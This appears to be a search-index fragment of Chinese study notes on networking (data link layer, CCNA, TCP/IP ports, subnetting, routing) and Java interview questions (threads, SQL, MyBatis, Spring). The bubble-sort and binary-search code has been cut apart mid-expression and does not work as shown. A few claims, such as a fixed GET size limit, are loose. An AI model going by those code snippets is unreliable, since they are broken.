"},"韩立刚计算机网络/数据链路层.html":{"url":"韩立刚计算机网络/数据链路层.html","title":"数据链路层","keywords":"","body":"数据链路层 信道类型 点对点信道：这种信道使用一对一的点对点通信方式。 广播信道：这种信道使用一对多的广播通信方式，因此过程比较复杂。广播信道上连接的主机很多，因此必须使用专用的共享信道协议来协调这些主机的数据发送。 链路与数据链路 链路（link）：是一条点到点的物理线路段，中间没有任何其他的交换结点。 一条链路只是一条通路的一个组成部分。 数据链路（data link）：除了物理线路外，还必须有通信协议来控制这些数据的传输。若把实现这些协议的硬件和软件加到链路上，就构成了数据链路。 现最常用的方法是使用适配器（即网卡）来实现这些协议的硬件和软件。 一般的适配器都包括了数据链路层和物理层这两层的功能。 数据链路层传送的是帧 三个基本问题 封装成帧 封装成帧（framing）：就是在一段数据的前后分别添加首部和尾部，然后就构成了一个帧。确定帧的界限。 首部和尾部的一个重要作用就是进行帧定界。确保数据完整接收。 透明传输 当传送的帧是用文本文件组成的帧时（文本文件中的字都是从键盘上输入的），其数据部分显然不会出现像SOH或EOT这样的帧定界控制字符。可见不管从键盘上输入什么字符都可以放在这样的帧中传输过去，因此这样的传输就是透明传输。 但当数据部分是非ASCII码的文本文件时（如二进制代码的计算机程序或者图像等），情况就不同了。如果数据中的某个字节的二进制代码恰好和SOH或EOT这种控制字符一样，数据链路层就好错误地“找到帧的边界”，把部分帧收下（误以为是个完整的帧），而把剩下的那部分数据丢弃（这部分找不到帧定界控制字符SOH）。这种情况就不是透明传输，因为当遇到书中碰巧出现字符“EOT”时就传不过去了，而其后面的数据因找不到“SOH”被接收端当做无效帧而丢弃。但实际上数据中出现的字符“EOT”并非控制字符而仅仅是二进制数据00000100 。 为了解决透明传输问题，字节填充法或字符填充：在控制字符SOH、EOT的前面插入一个转义字符ESC（其十六进制编码是1B，二进制是00011011）。而接收端的数据链路层在把数据送往网络层之前删除这个插入的转义字符。 差错检测 现实的通信链路都不会是理想的。传输过程中，1可能变成0, 0 可能变成1 。这就叫比特差错。——误码率。 误码率和信噪比有很大的关系。 因此，在计算机网络传输数据时，必须采用各种差错控制技术。目前在数据链路层广泛使用了循环冗余检验（CRC）的检错技术。在数据链路层的CRC检验都是用硬件完成的，处理很迅速，因此不会延误数据的传输。（除数越大，校错能力越强） 对于通信质量良好的有线传输链路，数据链路层协议不使用确认和重传机制，即不要求数据链路层向上提供可靠传输的服务。如果在数据链路层传输数据时出现了差错并且需要进行改正，那么改正差错的任务就由上层协议（例如，运输层的TCP协议）来完成。 对于通信质量较差的无线传输链路，数据链路层协议使用确认和重传机制，数据链路层向上提供可靠传输的服务。 载波监听多点接入/碰撞检测 CSMA/CD CSMA/CD 表示 Carrier Sense Multiple Access with Collision Detection。 “多点接入”表示许多计算机以多点接入的方式连接在一根总线上。 “载波监听”是指每一个站在发送数据之前先要检测一下总线上是否有其他计算机在发送数据，如果有，则暂时不要发送数据，以免发生碰撞。 总线上并没有什么“载波”。因此， “载波监听”就是用电子技术检测总线上有没有其他计算机发送的数据信号。 特点： 使用 CSMA/CD 协议的以太网不能进行全双工通信而只能进行双向交替通信（半双工通信）。 每个站在发送数据之后的一小段时间内，存在着遭遇碰撞的可能性。 这种发送的不确定性使整个以太网的平均通信量远小于以太网的最高数据率。 争用期： 最先发送数据帧的站，在发送数据帧后至多经过时间 2τ（两倍的端到端往返时延）就可知道发送的数据帧是否遭受了碰撞。 以太网的端到端往返时延 2τ称为争用期，或碰撞窗口。 经过争用期这段时间还没有检测到碰撞，才能肯定这次发送不会发生碰撞。 以太网的端到端往返时延2t称为争用期，或碰撞窗口。通常，取51.2us为争用期的长度。 对于10Mb/s以太网，在争用期内可发送512bit，即64字节。 以太网在发送数据时，若前64字节未发生冲突，则后续的数据就不会最短有效帧长。 如果发生冲突，就一定是在发送的前64字节之内。 由于一检测到冲突就立即中止发送，这时已经发送出去的数据一定小于64字节。 以太网规定了最短有效帧长为64字节，凡长度小于64字节的帧都是由于冲突而异常中止的无效帧。 二进制指数类型退避算法 ： 发生碰撞的站在停止发送数据后，要推迟（退避）一个随机时间才能再发送数据。 确定基本退避时间，一般是取为争用期 2τ。 定义重传次数 k ，k≤10，即：k = Min[重传次数, 10] 从整数集合[0,1,…, (2k-1)]中随机地取出一个数，记为 r。重传所需的时延就是 r 倍的基本退避时间。 当重传达 16 次仍不能成功时即丢弃该帧，并向高层报告。 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 13:27 "},"韩立刚CCNA/计算机网络.html":{"url":"韩立刚CCNA/计算机网络.html","title":"计算机网络","keywords":"","body":"计算机网络 OSI模型 应用层 表示层 会话层 netstat -nb查看进程连接 传输层 可靠传输：建立会话 流量控制 差错检查；不可靠传输：不建立会话，节省服务器资源 网络层 选择最佳路径 数据链路层 网络设备如何封装数据帧、设备地址MAC 物理层 电压标准 接口标准 网络排错和OSI参考模型 物理层 连接问题 数据链路层 MAC地址冲突、ADSL拨号密码错误 网络层 计算机网关设置错误、路由器路由表错误 应用程序问题 IE代理设置错误 网络安全 物理层安全 数据链路层安全 MAC地址认证、ADSL拨号上网账号密码、划分VLAN 网络层安全 路由器ACL 传输层安全 端口安全 应用层安全 网站安全、操作系统安全 网卡 MAC 物理地址 硬件地址 不能更改（可改注册表用管理员给的MAC）48位二进制组成，前24代表厂家，后24位由厂家自定；以16进制显示 集线器HUB：不安全、宽带共享、易发生通讯冲突 网桥：学习MAC地址表、隔绝冲突域提高通讯效率 交换机：由网桥演变而来（多口网桥），带宽独享、安全、全双工通信 路由器：负责在不同网段转发数据、隔绝广播（目标MAC全1即FFF…） 网络设备和OSI参考模型 集线器 物理层设备 交换机 基于MAC转发数据链路层设备 路由器 基于IP地址转发三层设备 在两个集线器之间连接一个网桥，网桥能够基于MAC地址表转发数据。如图所示，网桥有两个以太网接口E0和E1，并且知道E0对应哪些MAC地址，E1对应哪些MAC地址。当A计算机给B计算机发送一个数据帧，集线器将该数据帧扩散到所有的接口，网桥的E0接口收到该数据帧，查看目标MAC地址0260.8c01.222，该目标MAC对应E0接口，于是不转发到E1接口，这样就不影响C和D计算机的通信。 网桥将一个大的冲突域划分成两个冲突域，冲突域的数量增加了，但是冲突域减小了。网桥的一个接口就是一个冲突域。 如果网络中的计算机发送一个目标MAC地址为FFFF.FFFF.FFFF的数据帧，这样的数据帧称为广播（比如ARP协议就是使用广播解析对方MAC地址的），网桥将会将这样的帧转发到除了发送端口的所有端口。所有的端口在同一个广播域。 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 13:34 "},"韩立刚CCNA/TCP&IP.html":{"url":"韩立刚CCNA/TCP&IP.html","title":"TCP&IP","keywords":"","body":"TCP/IP 应用层协议： HTTP：TCP+80 HTTPS：TCP+443 FTP：TCP+21（连接）、20（传输数据） SMTP：TCP+25 POP3：TCP+110 RDP：TCP+3389 DNS：UDP+53 IP访问Windows共享文件夹：TCP+445 SQL：TCP+1433 Telnet：TCP+23 SSH：TCP+22 传输层协议 https://www.jianshu.com/p/c4090b09e154 UDP TCP 是否连接 无连接 面向连接 是否可靠 不可靠传输，不使用流量控制和拥塞控制 可靠传输，使用流量控制和拥塞控制，建立会话（消耗系统资源），丢失重传 连接对象个数 支持一对一，一对多，多对一和多对多交互通信 只能是一对一通信 传输方式 面向报文 面向字节流 首部开销 首部开销小，仅8字节 首部最小20字节，最大60字节 适用场景 适用于实时应用（IP电话、视频会议、直播等） 适用于要求可靠传输的应用，例如文件传输 网络层协议： IP协议：选择最佳路径的协议（RIP OSPF EIGRP BGP） ICMP协议：测试网络状态的协议（ping） pathping www.baidu.com 跟踪路径，计算丢包情况（利用了TTL，从1开始依次增加TTL） tracert -d www.baidu.com 跟踪路由 IGMP协议：组播（多播） ARP协议：将计算机的IP地址解析成MAC地址 arp -a 查看arp表 arp -s ip mac 更改对应关系 其他 服务和端口的关系：服务与端口一一对应（端口不能重复） netstat -anb | find \"3389\"（a：查看侦听端口 n：以数字显示 b：显示程序） 关闭Network Connections服务，则无法更改网络设置 TCP/IP筛选不影响出去（建立连接）的流量 winXP防火墙不影响出去（建立连接）的流量 IPSec严格控制进出计算机的流量 TCP/IP筛选比防火墙等级高，防火墙依赖于Windows Firewall服务 运行“msconfig”查看服务 运行“wf.msc”查看防火墙 ping单向不通，可能是防火墙 Windows防火墙无法拦截反弹式木马（需用IPSec拦截木马流量，白名单规则） 数据包（数据+IP）+MAC=数据帧 MAC地址决定下一跳给哪个设备 IP地址决定最终设备 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 13:48 "},"韩立刚CCNA/IP地址和子网.html":{"url":"韩立刚CCNA/IP地址和子网.html","title":"IP地址和子网","keywords":"","body":"IP地址和子网 二进制和十进制 00000001 1 00000010 2 00000100 4 00001000 8 00010000 16 00100000 32 01000000 64 10000000 128 10000000 128 11000000 192 11100000 224 11110000 240 11111000 248 11111100 252 11111110 254 11111111 255 IP地址：32位二进制 A类网络缺省子网掩码：255.0.0.0 B类网络缺省子网掩码：255.255.0.0 C类网络缺省子网掩码：255.255.255.0 保留的私网地址 A类10.0.0.0 B类172.16.0.0--172.31.0.0 C类192.168.0.0--192.168.255.0 本地环回地址：127.0.0.1 无法获取DHCP时的地址时，IP为169.254.0.0 等长子网划分 变长子网划分 主机号除4，余数为1、2能用 主机号除4，余数为3 的为广播地址 超网 余数为0,1,2,3可合并为一个网段，子网掩码左移2位；如上图合并为192.168.16.0/22 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2021-03-07 15:24 "},"韩立刚CCNA/静态路由.html":{"url":"韩立刚CCNA/静态路由.html","title":"静态路由","keywords":"","body":"静态路由 网络畅通的条件： 数据包能去能回 沿途的路由器必选知道到目标地址如何转发 沿途的路由器必选知道 回来的数据包如何转发 路由器直连的网络，不用告诉路由器如何转发 路由器没有直连的网络，管理员需要告诉路由器到目标网络如何转发（也就是添加静态路由） 路由汇总：即超网 Windows上添加路由表 添加路由表route add 0.0.0.0 mask 0.0.0.0 192.168.31.1 显示路由表route print 或 netstat -r 默认路由 网络地址和子网掩码都为0，如图所示配置，这就意味着到任何网络下一跳转发给10.0.0.2。 网络地址和子网掩码均为0的路由就是默认路由。 Router（config）#ip route 0.0.0.0 0.0.0.0 10.0.0.2 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 14:34 "},"韩立刚CCNA/动态路由.html":{"url":"韩立刚CCNA/动态路由.html","title":"动态路由","keywords":"","body":"动态路由 静态路由不会随着网络链路状态的变化自动选择最佳路径，网络中增加或修改了网段，都需要人工调整网络中路由器的路由表。 RIP协议 使用“跳数”来衡量到达目标地址的路由距离 30秒广播路由表 最大跳数16跳 EIGRP协议的优先级比RIP协议高 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 14:34 "},"韩立刚CCNA/交换机.html":{"url":"韩立刚CCNA/交换机.html","title":"交换机","keywords":"","body":"交换机 在两个集线器之间连接一个网桥，网桥能够基于MAC地址表转发数据。如图所示，网桥有两个以太网接口E0和E1，并且知道E0对应哪些MAC地址，E1对应哪些MAC地址。当A计算机给B计算机发送一个数据帧，集线器将该数据帧扩散到所有的接口，网桥的E0接口收到该数据帧，查看目标MAC地址0260.8c01.222，该目标MAC对应E0接口，于是不转发到E1接口，这样就不影响C和D计算机的通信。 网桥将一个大的冲突域划分成两个冲突域，冲突域的数量增加了，但是冲突域减小了。网桥的一个接口就是一个冲突域。 如果网络中的计算机发送一个目标MAC地址为FFFF.FFFF.FFFF的数据帧，这样的数据帧称为广播（比如ARP协议就是使用广播解析对方MAC地址的），网桥将会将这样的帧转发到除了发送端口的所有端口。所有的端口在同一个广播域。 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 14:36 "},"Java笔记/01-面试题.html":{"url":"Java笔记/01-面试题.html","title":"01-面试题","keywords":"","body":"Java基础 JDK JRE JVM的区别（必会） JDK：Java Development Kit，Java标准开发包，提供了编译和运行Java程序所需的各种工具和资源，包括Java编译器、Java运行环境，以及常用的Java类库等，程序员必须安装JDK来编译和调试程序 JRE：Java Runtime Environment，Java运行环境。普通用户只需安装JRE，即可运行Java程序 JVM：Java Virtual Mechine，Java虚拟机，是Java实现跨平台的最核心部分，负责解释执行字节码文件 JDK包含JRE，JRE包含JVM JVM是Java的核心并且具有平台独立性（体系结构无关、可移植） Final 有什么用？ 被final修饰的类不可以被继承 被final修饰的方法不可以被重写 被final修饰的变量不可以被改变， 被final修饰不可变的是变量的引用，而不是引用指向的内容， 引用指向的内容是可以改变的 重载和重写的区别（必会） 重载：在同一个类中，方法名相同，参数列表不一致即构成重载，与返回值类型无关 重写：发生没有被private修饰的在子父类中，方法名和参数列表必须相同，子类的返回值、抛出的异常范围小于等于父类，权限修饰符范围大于等于父类 ==和equals的区别（必会） == 基本类型：比较值是否相同 引用类型：比较地址值是否相同 equals 重写前比较地址值 重写后按重写方法的逻辑进行比较 String、Integer、Date类中equals被重写过，比较的是内容 String、StringBuffer、StringBuilder的区别（必会） String是final类，内部维护了一个常量字符数组private final char value[];，所以String类一旦实例化，他的值就不能改变 StringBuffer类JDK1.0提供，为字符串拼接和将其他对象转换为字符串提供了特殊支持类，内部维护字符数组，其实例的值可以被改变，其字符串运算方法由synchronized修饰，是同步的 StringBuilder类JDK1.5提供，与StringBuffer的API兼容，但不同步，用于在单线程下替代StringBuffer 区别： 可变性：String是final类，StringBuffer和StringBuilder不是 线程安全：StringBuffer是JDK1.0提供，线程安全，在并发修改的情况下推荐；Stringbuilder是JDK1.5提供，线程不安全，单线程情况下推荐使用 单例模式（必会） 单列模式：在程序运行时，同一个类只有一个实例 常用的单例设计模式有五种 饿汉式 懒汉式 懒汉加锁 懒汉双检锁 静态内部类实现单例 接口和抽象类（必会） 抽象类要被子类继承；接口要被类实现 抽象类中的变量是普通变量；接口里定义的变量只能是公共的静态的常量 类只能单继承；接口可继承接口，并且可以多继承 手写冒泡排序（必会） public static void bubbleSort(int[] buf){ int temp; for (int i = 0; i 二分查找 private static int getIndex(int[] arr, int i) { int minIndex = 0; int maxIndex = arr.length - 1; while (minIndex arr[midIndex]) { minIndex = midIndex + 1; } else { return midIndex; } } return -1; } ArrayList和LinkedList的区别 相同点：ArrayList和LinkedList都实现了List接口，用于存储一系列的引用对象。都可以对元素进行增删改查操作 数据结构：ArrayList 是动态数组的数据结构实现，而 LinkedList 是双向链表的数据结构实现。 随机访问效率：ArrayList 比 LinkedList 在随机访问的时候效率要高，因为 LinkedList 是线性的数 据存储方式，所以需要移动指针从前往后依次查找。 增加和删除效率：在非首尾的增加和删除操作，LinkedList 要比 ArrayList 效率要高，因为 ArrayList 增删操作要影响数组内的其他数据的下标。 内存空间占用：LinkedList 比 ArrayList 更占内存，因为 LinkedList 的节点除了存储数据，还存储 了两个引用，一个指向前一个元素，一个指向后一个元素。 线程安全：ArrayList 和 LinkedList 都是不同步的，也就是不保证线程安全； 二、集合 List、Map、Set的区别（必会） List和Set是存储单列数据的集合，Map是存储键值对这样的双列数据的集合 List中的数据是有顺序、可重复的 Set中的数据是无序的、不重复的；HashSet靠重写hashCode和equals实现去重；TreeSet靠实现Comparable接口方法或Comparator比较器实现去重 Map中是数据是无序的，他的键不可以重复，值可以重复 三、多线程 创建多线程的四种方式（必会） 继承Thread类并重写run方法，实现简单但不能继承其他类 实现Runnable接口并重写run方法，避免了单继承局限性，实现解耦 实现Callable接口并重写call方法，可以获取线程执行结果的返回值，并且可以抛异常 使用线程池创建 Runnable和callable的区别（必会） Runnable无返回值，只能抛运行异常，且无法捕获处理 callable有返回值，支持泛型，允许抛出异常，和Future、 FutureTask配合可以用来获取异步执行的结果，但此方法会阻塞主进程的继续往下执行，如果不调用不会阻塞。 如何启动一个新线程，调用start和run方法的区别（必会） 线程对象调用run方法不开启线程，仅是对象调用方法 线程对象调用start开启线程，并让jvm调用run方法在开启的线程中执行 调用start方法可以启动线程，并且使得线程进入就绪状态，而run方法只是thread的一个普通方法，还是在主线程中执行 线程有哪几种状态以及状态之间的转换（必会） 有NEW、RUNNABLE、TERMINATED、BLOCKED、WATING、TIMED_WATING六种状态 NEW：尚未启动的线程处于此状态 RUNNABLE：在Java虚拟机中执行的线程处于此状态 BLOCKED：被阻塞等待监视器锁定的线程处于此状态 WAITING：无限期等待另一个线程执行特定操作的线程处于此状态 TIMED_WAITING：等待另一个线程执行操作的线程在指定的等待时间内处于此状态 TERMINATED：已退出的线程处于此状态 线程相关的基本方法（必会） 线程相关基本方法有：wait、sleep、notifly、notiflyall、jion、yield等 线程等待（wait）： 一般用在同步方法或同步代码块中，调用该方法线程会释放锁并进入WAITING状态，只有等待其他线程通知或被中断才会返回 线程睡眠（sleep） 使当前线程进入TIMED_WAITING状态，但是不会释放锁，休眠时间到了后继续执行代码 线程让步（yield） 使当前线程让出CPU执行时间片，重新参与锁的竞争 线程中断（interrupt） 中断一个线程，会影响这个线程内部的中断标识位，但不会改变线程状态 等待其他线程终止（join） 使当前线程转为阻塞状态，join另一个线程直到该线程结束，当前线程再有阻塞状态变为就绪状态，重新参与锁的竞争 线程唤醒（notify） Object类的方法，唤醒正在等待锁的单个线程，如果有多个线程同时在等待，只会随机唤醒某个线程 wait()和sleep()的区别（必会） 区别 wait() sleep() 所属类 Object类 Thread类 锁的释放 在等待过程中会释放锁 在等待过程中不会释放锁 使用范围 必须在同步代码块中使用 可以在如何地方使用 四、线程池 Java中的线程池类 可进行缓存重复利用的线程池、可重用固定线程数的线程池、只执行一个线程的线程池（队列）、只执行一个线程的线程池（延迟或定期执行）、给定延迟运行命令或定期执行的线程池、带并行级别的线程池 newCachedThreadPool：创建一个可进行缓存重复利用的线程池 newFixedThreadPool：创建一个可重用固定线程数的线程池，以共享的无界队列方式来运行这些线程，线程池中的线程处于一定的量，可以很好的控制线程的并发量 newSingleThreadExecutor：创建一个使用单个 worker 线程的Executor ，以无界队列方式来运行该线程。线程池中最多执行一个线程，之后提交的线程将会排在队列中以此执行 newSingleThreadScheduledExecutor：创建一个单线程执行程序，它可安排在给定延迟后运行命令或者定期执行 newScheduledThreadPool：创建一个线程池，它可安排在给定延迟后运行命令或者定期的执行 newWorkStealingPool：创建一个带并行级别的线程池，并行级别决定了同一时刻最多有多少个线程在执行，如不传并行级别参数，将默认为当前系统的CPU核心数*2 Java线程池创建时核心参数（高薪常问） corePoolSize：核心线程数量 maximumPoolSize：最大线程数量（核心线程+临时线程） keepAliveTime：空闲线程存活时间 unit：时间单位（毫秒、秒、分、时） workQueue：阻塞队列，用于保存任务的阻塞队列（默认为int最大值） threadFactory：创建线程的工程类 handler：饱和策略（拒绝策略）默认会抛出异常 五、网络 网络七层架构 物理层 主要定义物理设备标准，如接口类型、传输速率等。主要作用是传输比特流，模数转换和数模转换发生在这一层，这一层的数据叫做比特 数据链路层 主要将物理层接收的数据进行MAC地址的封装和解封装。这一层的数据叫做帧，工作设备主要是交换机 网络层 主要将下层接收到的数据进行IP地址的封装和解封装。这一层的数据叫做数据包，工作设备主要是路由器 传输层 定义传输数据的协议和端口，主要是将从下层接收的数据进行分段传输，到达目的地址后进行重组。这一层数据叫做段 会话层 通过传输层建立数据传输的通道，主要是在系统之间发起会话或接受会话请求 表示层 主要对接收的数据进行解释、加密和解密、压缩和解压缩等，也就是把计算机能够个识别的东西转换成人能识别的东西 应用层 主要是一些终端应用 TCP和UDP的区别 连接 TCP需要建立连接； UDP无需建立连接 可靠性 TCP提供交付保证，传输过程数据丢失会重发； UDP不提供交付保证，传输过程数据会丢失 有序性 信息到达网络另一端时可能是无序的，TCP会进行排序，UDP不提供排序 速度 TCP比较慢，UDP速度比较快；因为TCP必须创建连接 报头大小 TCP是重量级协议，报头最少是20字节，包含源端口、目的端口、序列号、ACK号、数据偏移量、保留、控制位、窗口、紧急指针、可选项、填充项、校验位 UDP是轻量级协议，报头固定8个字节，包含长度、源端口号、目的端口、校验位 流量控制和拥塞控制 TCP有流量控制和拥塞控制 UDP没有流量控制和拥塞控制 边界记录 TCP是面向字节流的协议，无边界记录 UDP是面向报文的协议，发送的每个数据报都是记录型的数据报，就是接收进程可以识别接收到的数据报的记录边界 广播和组播 TCP只能单播 UDP可以广播和组播 应用场景 TCP：因为传输中需要对数据进行确认、重发、排序等操作，相比之下效率没有UDP高。因此应用在效率要求相对低，但对准确性要求相对高的场景。如：文件传输、邮件传输、远程登录 UDP应用在效率要求相对高，对准确性要求相对低的场景。如：视频聊天、即时通讯、广播通信 数据库 连接查询 内连接 隐式内连接：select 字段名 from 表1，表2 where 条件; 显式内连接：select 字段名 from 表1 [inner] join 表2 on 表连接条件; 外连接 左外连接：select 字段名 from 表1 left [outer] join 表2 on 表连接条件; 以左表为基准进行查询，左表的数据会全部显示出来，右表如果和左表匹配，则显示相应的数据，如果不匹配，则显示为null 右外连接：select 字段名 from 表1 right [outer] join 表2 on 表连接条件; 以右表为基准进行查询，右表的数据会全部显示出来，左表如果和左表匹配，则显示相应的数据，如果不匹配，则显示为null 聚合函数 count：是用来统计值为非NULL字段数量的；当字段名为*时统计所有行数 sum：对数值类型的字段求和 avg：对数值类型的字段求平均值 max：对数值类型的字段求最大值 min：对数值类型的字段求最小值 SQL关键字 分页limit：select * from 表名 limit 跳过数量,显示数量; 分组groud by：select 字段名, count(*) from 表名 groud by 字段名; 去重distinct：select distinct 字段名 from 表名; Mysql查询语句的书写顺序 Select [distinct ] from 表1 [ join 表2 on ] where group by having order by limit Mysql查询语句的执行顺序 from...where...group by...having...select...order by...limit... 数据库事务 事务特性ACID 原子性：事务是不可分割的最小操作单位，要么同时成功，要么同时失败 一致性：使得数据库从一种正确状态转换成另一种正确状态 隔离性：在事务正确提交之前，不允许把该事务对数据的任何改变提供给任何其他事务 持久性：事务正确提交后，其结果将永久保存在数据库中，即使在事务提交后有了其他故障，事务的处理结果也会得到保存 隔离级别 读未提交：所有的事务都可以读取到别的事务中未提交的数据，会产生脏读问题 读已提交：是大多数数据库默认的隔离级别，满足了简单的隔离要求：一个事务只能看见已经提交事务的数据，可以避免脏读问题；但随之而来产生了不可重复读和虚读等问题 不可重复读：是指在一个事务内，多次读同一数据。在这个事务还没有结束时，另外一个事务也访问该同一数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改，那么第一个事务两次读到的的数据可能是不一样的。这样就发生了在一个事务内两次读到的数据是不一样的，因此称为是不可重复读。 幻读（虚读）：是指当事务不是独立执行时发生的一种现象，例如第一个事务对一个表中的数据进行了修改，这种修改涉及到表中的全部数据行。同时，第二个事务也修改这个表中的数据，这种修改是向表中插入一行新数据。那么，以后就会发生操作第一个事务的用户发现表中还有没有修改的数据行，就好象发生了幻觉一样。 不可重复读和幻读（虚读）差别 不可重复读的重点是修改： 同样的条件，你读取过的数据，再次读取出来发现值不一样了 幻读的重点在于新增或者删除： 同样的条件，第 1 次和第 2 次读出来的记录数不一样 简单来讲，前一个是读取到的数据不一样，后一个是读取到的数据量不一样 可重复读：MySQL默认隔离级别，确保了一个事务中多个实例在并发读取数据时，读取到一样的数据；但也导致了幻读的问题 幻读指当用户读 取某一范围的数据行时，另一个事务又在该范围内插入了新行，当用户再读取该范围的数据行时，会发现有新的“幻影” 行，可通过多版本并发控制（MVCC）机制解决该问题 可串行化：事务的最高级别，通过强制事务排序，使之不会相互冲突，从而解决幻读问题。它是在每个读的数据行上加锁，这样一来大幅降低事务的并发能力 SQL语言分为哪几部分 数据定义DDL：creat创建、alter修改、drop删除 数据操作DML：insert增、delete删、update改 数据控制DCL：grant允许、revoke废弃 数据查询DQL：select查询 MyBatis 在Mybatis中，${} 和 #{} 的区别是什么? ${}：底层是statement，实际上是对变量进行字符串的拼接，因此存在SQL注入的风险 {}：底层是preparedStatement，实际上是将其替换为？，并进行预编译，可以防范SQL注入 在Mybatis中，resultType和ResultMap的区别是什么? 一般情况下，当数据库字段名和实体类对象的成员变量名一致时，用resultType 当数据库字段名和实体类对象的成员变量名不一致时，用resultMap，通过resultMap手动建立映射关系 但是，在多表查询时，即使类的成员变量名和数据库字段名一致，也不会完成自动映射，需要通过resultMap手动建立映射关系 在Mybatis中，动态SQL标签有哪些?作用是什么? if标签，用于判断传入的值是否符合某种规则 where标签，用于做动态拼接查询条件，自动补全where关键字，去掉多余的and和or关键字 set标签，用在update语句中，相当于set关键字，可去掉SQL语句中多余的逗号 foreach标签，用于对传入的集合进行遍历，把每一项内容作为参数传入SQL语句汇中 include标签，用于将大量的重复代码整理起来，减少代码重复率，当使用的时候直接include即可 Web GET和POST的区别 GET是from默认的提交方式，执行效率比POST要高 请求体：GET没有请求体 安全性： GET的参数放在URL中，是不安全的； POST请求参数通过消息体传输，相对安全 数据量： GET传输的数据受URL长度限制，数据量较小，一般在18kb以内； POST传输的数据量不受限制 编码： GET请求使用的是ASCII字符； POST请求使用的是ISO10646字符集 使用情形： 传输非敏感数据，数据量小，推荐使用get； 传输敏感数据，数据量大，推荐使用post Servlet生命周期 web服务器从创建servlet对象到销毁的过程 方法： init()：初始化方法，在创建servlet对象后立即调用，只会调用一次 service()：处理请求方法，每次请求时都会调用 destroy()：销毁方法，当前服务器关闭或重启时调用 创建时机 默认是第一次访问时创建servlet对象，并且只会创建一次，是单例对象 通过配置loadOnStartup可以设置创建时机 负整数：第一次被访问时再创建Servlet对象 0或正整数：服务器启动时创建Servlet对象，数字越小优先级越高 HTTP中重定向和请求转发的区别 请求转发：是一种服务器内部的资源跳转方式 实现：request.getRequestDispatcher(\"资源路径\").forword(request,response); 浏览器只发出一次请求，URL不改变 只能转发到当前服务器内部的资源 可以在转发的资源间共享数据 重定向：是一种资源跳转方式 实现：方式一：response.SetStatus(302);response.SetHeader(\"location\",\"\"资源路径);，方式二：response.sendRedirect(\"资源路径\"); 浏览器发出两次请求，URL发生改变 可以重定向到任意位置的资源 不能在资源键共享数据 Jsp和Servlet的区别 JSP本质上就是一个Servlet，最终调用的就是==_jspService方法==。JSP在被访问时，由JSP容器（Tomcat）将其转换为Java文件（Serclet），再由JSP容器（Tomcat）将其编译，最终对外提供服务的其实就是这个字节码文件 不同点： JSP侧重展现数据，servlet主要用于逻辑控制和获取数据 jsp中的内置对象都必须通过HttpServletRequest对象，HttpServletResponse对象以及HttpServlet对象得到；servlet中没有内置对象 cookie和session的区别 存储位置 cookie的数据存储在客户端浏览器上，不占用服务器资源，并发友好 session的数据存储在服务器上，占用服务器资源 存储容量不同 单个cookie的大小 session没有限制 存储方式不同 cookie只能保管ASCII字符串，并需要通过编码存储为unicode字符或二进制数据 session中能存储任何类型的数据，包括但不限于string、integer、list、map 安全性 cookie存储在客户端，对于用户是可见的，存在cookie欺骗 session存储在服务器上相对更加安全 有效期不同 cookie可以通过设置达到长期有效 session默认是在浏览器关闭则失效 Ajax 什么是Ajax，及其优势 Ajax即异步的JavaScript和XML，能在不更新整个页面的前提下更新数据 提升用户体验 优化了浏览器和服务器之间传输的数据量，减少不必要的数据传输，降低宽带占用 JavaWeb的三大组件及作用 Servlet：用于处理请求与响应 Filter：用于拦截请求与响应 Listener：用于监听三大域对象request、response、servletContext的创建和销毁，以及域中数据发生变化时调用监听器实现逻辑控制 过滤器 执行流程：访问被拦截的web资源时首先会经过过滤器，执行放行前的代码当放行后再访问web资源最后在返回到过滤器执行放行后的代码 生命周期：在服务器启动时创建，服务器关闭之前销毁 应用场景：权限控制、全局乱码统一处理 监听器 实现步骤： 创建类实现监听器接口 重写监听器接口的所有方法 在实现类上添加@WebListener注解，定义为监听类 应用场景：对ServletContext监听，在ServletContext对象创建后和销毁前，进行创建mysql连接池、线程池等操作、销毁mysql连接池、线程池等操作 Spring Spring的两大核心是什么? IOC：控制反转，是一种解耦合的设计思想 就是将原本在程序中手动创建对象的控制权交给spring框架来管理 当程序中需要一个对象时，不再使用new的方式主动创建，而是从spring容器中获取，spring容器会通过工厂模式来创建对象 如果容器中的对象依赖于其他对象，spring则会依赖IOC容器来动态注入对象需要的外部资源 IOC的注入方式：构造器注入、setter方法注入、根据注解注入 AOP：面向切面编程，核心思想是将那些与业务无关，却被业务模块共同使用的功能抽取并封装为一个单独的模块，这个模块就称为“切面” AOP是基于动态代理实现的，底层同时支持JDK和CGlib的代理方式，会根据被代理类是否有接口自动选择代理方式。当被代理类有接口时，就会使用JDK动态代理；如果没有接口，就会使用CGlib动态代理，JDK动态代理（反射机制）的效率会比CGlib（字节码技术）的效率更高。 主要的应用场景有：事务管理、日志、性能监视、安全检查等 使用AOP可以减少系统的冗余代码，降低模块间的耦合度，有利于代码的扩展和维护 Spring支持bean的作用域有几种吗? 每种作用域是什么样的? singleton：单例模式，对象仅创建一次，然后一直存在容器中（随Spring容器启动而创建；随Spring容器销毁而销毁） prototype：多例模式，每次获取对象时，容器都会创建一个新对象（spring框架只负责创建，不负责销毁；销毁时机是由Java垃圾回收机制决定的 ） request：每一次HTTP请求都会产生一个新的对象，该对象仅在当前请求内有效 session：每一次HTTP会话都会产生一个新的对象，该对象仅在当前会话内有效 Spring框架中都用到了哪些设计模式? 工厂模式：Spring使用工厂模式通过BeanFactory和ApplicationContext创建bean对象 单例模式：Spring中的bean默认都是单例的 代理模式：Spring的AOP功能用到了JDK的动态代理和CGLIB字节码生成技术 模板方法：用来解决代码重复的问题，比如RestTemplate、jdbcTemplate 适配器模式：SpringAOP的增强或通知使用到了适配器模式 观察者模式：Spring事件驱动模型，如Spring实现ApplicationListener Spring常用注解 注解 作用 @Component（任何层） 用于实例化对象 @Controller 用于实例化对象 